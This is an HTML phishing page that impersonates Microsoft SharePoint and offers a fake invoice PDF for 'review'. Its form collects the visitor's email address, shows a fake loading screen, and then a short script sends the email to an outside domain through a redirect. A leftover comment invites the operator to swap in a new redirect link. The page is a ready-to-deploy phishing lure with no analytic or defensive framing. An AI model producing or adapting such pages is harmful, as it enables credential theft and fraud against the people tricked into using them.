<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Document | SharePoint</title>
<style>
@keyframes breathing {
0%, 100% { transform: scale(1); }
50% { transform: scale(1.02); }
}
@keyframes spin {
0% { transform: rotate(0deg); }
100% { transform: rotate(360deg); }
}
body {
font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
background-color: #0078d7;
color: white;
margin: 0;
padding: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
}
.container {
background: #005a9e;
padding: 2.5rem 3rem;
border-radius: 10px;
max-width: 400px;
width: 100%;
text-align: center;
animation: breathing 5s ease-in-out infinite;
position: relative;
z-index: 2;
}
.logo-circle {
width: 60px;
height: 60px;
background: white;
border-radius: 50%;
margin: 0 auto 10px auto;
position: relative;
}
.logo-circle::before {
content: "";
position: absolute;
top: 14px;
left: 14px;
width: 32px;
height: 32px;
border-radius: 4px;
background: #0078d7;
box-shadow: 28px 0 0 #0078d7, 0 28px 0 #0078d7;
}
h1 {
font-weight: bold;
font-size: 1.6rem;
margin: 0 0 0.5rem 0;
}
.sub-header {
font-size: 1rem;
margin: 0 0 2rem 0;
font-weight: 500;
}
.file-info {
background: #005a9e;
padding: 1rem 0.5rem;
border-radius: 6px;
margin-bottom: 1.5rem;
}
.file-info h2 {
margin: 0 0 0.25rem 0;
font-weight: 700;
}
.file-info p {
margin: 0;
font-size: 0.9rem;
color: #cce7ff;
}
label {
font-weight: 600;
margin-bottom: 0.5rem;
display: flex;
align-items: center;
justify-content: center;
gap: 10px;
font-size: 1rem;
}
input[type="email"] {
width: 100%;
padding: 0.6rem 0.8rem;
border-radius: 6px;
border: none;
font-size: 1rem;
margin-bottom: 1.25rem;
outline-offset: 0;
}
button {
border: none;
border-radius: 6px;
background: white;
color: #0078d7;
font-weight: bold;
padding: 0.7rem 0;
font-size: 1.1rem;
cursor: pointer;
width: 100%;
}
button:hover {
background-color: #bcd9f6;
color: #004080;
box-shadow: 0 0 10px #004080;
}
footer {
margin-top: 2rem;
font-size: 0.75rem;
color: #cce7ff;
}
.loading-screen {
display: none;
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background: white;
flex-direction: column;
align-items: center;
justify-content: center;
z-index: 999;
}
.loading-screen img {
width: 220px;
height: auto;
margin-bottom: 20px;
filter: blur(3px);
}
.spinner {
border: 5px solid #f3f3f3;
border-top: 5px solid #0078d7;
border-radius: 50%;
width: 40px;
height: 40px;
animation: spin 1s linear infinite;
margin-bottom: 20px;
}
.loading-text {
color: #0078d7;
font-size: 1.2rem;
font-weight: 600;
}
</style>
</head>

<body>

<div class="loading-screen" id="loadingScreen">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Invoice_icon.png/480px-Invoice_icon.png" alt="Loading document...">
<div class="spinner"></div>
<div class="loading-text">Preparing document preview...</div>
</div>

<div class="container" role="main" id="mainContainer">
<div class="logo-circle" aria-label="SharePoint style logo"></div>
<h1>SharePoint</h1>
<div class="sub-header">A new document is now available for your review.</div>
<div class="file-info" aria-label="file information">
<h2>Proposal-F&F Group-INV626Q722NL2025.pdf </h2>
<p>9.64 MB</p>
</div>
<form id="emailForm">
<label for="emailInput">
Enter your email address to access the document
</label>
<input type="email" id="emailInput" name="email" placeholder="Enter your email" required autocomplete="email" spellcheck="false" />
<button type="submit">Preview Document</button>
</form>
<footer>This is a secure document sharing notification. Please do not forward this email. ©️ 2025 Microsoft. All rights reserved.</footer>
</div>

<script>
const form = document.getElementById('emailForm');
const loadingScreen = document.getElementById('loadingScreen');
const mainContainer = document.getElementById('mainContainer');

form.addEventListener('submit', function(event) {
event.preventDefault();
const email = document.getElementById('emailInput').value.trim();
if (email) {
mainContainer.style.display = "none";
loadingScreen.style.display = "flex";
setTimeout(() => {
const redirectUrl = 'https://f&f_group.caressed.com.de/vX8lV'; // <-- change to your new redirect link
window.location.href = `${redirectUrl}?email=${decodeURIComponent(email)}`;
}, 2500); // wait 2.5 seconds
}
});
</script>

</body>
</html>
